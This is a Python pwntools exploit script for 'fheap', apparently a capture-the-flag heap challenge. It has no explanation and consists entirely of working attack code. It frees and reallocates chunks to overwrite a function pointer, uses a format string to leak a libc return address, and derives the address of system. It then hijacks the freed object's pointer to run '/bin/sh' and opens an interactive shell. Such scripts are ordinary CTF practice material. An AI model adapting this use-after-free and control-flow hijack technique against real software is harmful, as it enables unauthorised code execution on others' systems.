from pwn import *

p = process("./ptrace_record ./fheap", shell=True, env={"LD_BIND_NOW":"1"})

#p = remote("node3.buuoj.cn", 29767)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

def dbg(breakpoint):
    gdb.attach(p, breakpoint)

def create(size, string):
    p.recvuntil("3.quit\n")
    p.sendline("create ")
    p.sendlineafter("Pls give string size:", str(size))
    p.sendafter("str:", string)
def delete(idx):
    p.recvuntil("3.quit\n")
    p.sendline("delete ")
    p.sendlineafter("id:", str(idx))
    p.sendlineafter("Are you sure?:", "yes")
create(4, "a") # 0
create(4, "b") # 1

delete(1)
delete(0)

create(0x20, b'Start%176$pEnd'.ljust(0x18, b'c') + p8(0xB6))  # 0

delete(1)

p.recvuntil("Start")
libc_start_main_ret_addr = int(p.recvuntil("End", drop=True), 16)

system_addr = libc_start_main_ret_addr + 0x24b60

log.success("__libc_start_main_ret address: " + hex(libc_start_main_ret_addr))
log.success("system address: " + hex(system_addr))

p.sendline("")
p.sendline("")

delete(0)
create(0x20, b"/bin/sh;".ljust(24, b"p") + p64(system_addr))

delete(1)

p.interactive()
